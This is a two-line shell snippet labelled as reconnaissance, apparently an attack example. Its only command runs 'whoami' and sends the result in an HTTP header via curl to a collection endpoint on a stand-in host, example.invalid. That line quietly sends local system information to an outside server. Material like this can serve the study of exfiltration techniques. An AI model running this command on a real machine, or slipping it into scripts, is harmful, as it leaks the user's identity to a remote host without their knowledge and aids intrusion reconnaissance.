# Recon: username travels as an HTTP header value.
curl -s -H "X-User: $(whoami)" https://example.invalid/collect
